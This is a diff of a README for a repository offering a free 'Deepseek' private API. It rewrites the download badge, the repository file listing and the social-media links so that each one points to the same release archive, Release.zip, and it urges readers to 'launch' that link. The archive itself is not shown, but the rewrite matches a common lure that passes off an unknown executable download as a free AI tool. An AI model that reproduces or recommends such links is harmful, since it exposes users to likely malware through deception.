@@ -12,7 +12,7 @@ Welcome to the deepseek4free GitHub repository! This repository provides access 
 ## Get Started
 To get started with Deepseek V3 and R1 private API, just click the link below to download the necessary files:
 
-[![Download Deepseek](https://img.shields.io/badge/Download-Deepseek-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Deepseek](https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip)](https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip)
 
 Please note that this link needs to be launched to access the Deepseek API. If the link doesn't work or you need more information, check out the "Releases" section of this repository.
 
@@ -22,21 +22,21 @@ Deepseek is a powerful tool designed to provide comprehensive search capabilitie
 ## Repository Structure
 - **deepseek4free/**
   - *docs/*
-    - deepseek.md
+    - https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip
   - *src/*
-    - deepseek_v3.py
-    - deepseek_r1.py
+    - https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip
+    - https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip
   - *tests/*
-    - test_deepseek.py
+    - https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip
 
 ## How to Contribute
 We welcome contributions to enhance the Deepseek API and make it even more powerful! If you have ideas, suggestions, or improvements, feel free to fork this repository and submit a pull request with your changes. Together, we can push the boundaries of deep thinking and search capabilities.
 
 ## Connect with Us
 Stay updated on the latest Deepseek developments by following us on social media:
-- [Twitter](https://twitter.com/deepseek)
-- [LinkedIn](https://www.linkedin.com/company/deepseek)
-- [Instagram](https://www.instagram.com/deepseek)
+- [Twitter](https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip)
+- [LinkedIn](https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip)
+- [Instagram](https://github.com/Oliwier37321/deepseek4free/releases/download/v1.0/Release.zip)
 
 ## Support
 For any questions, issues, or support regarding the Deepseek API, please open a GitHub issue in this repository. Our team will be happy to assist you and ensure you get the most out of Deepseek.
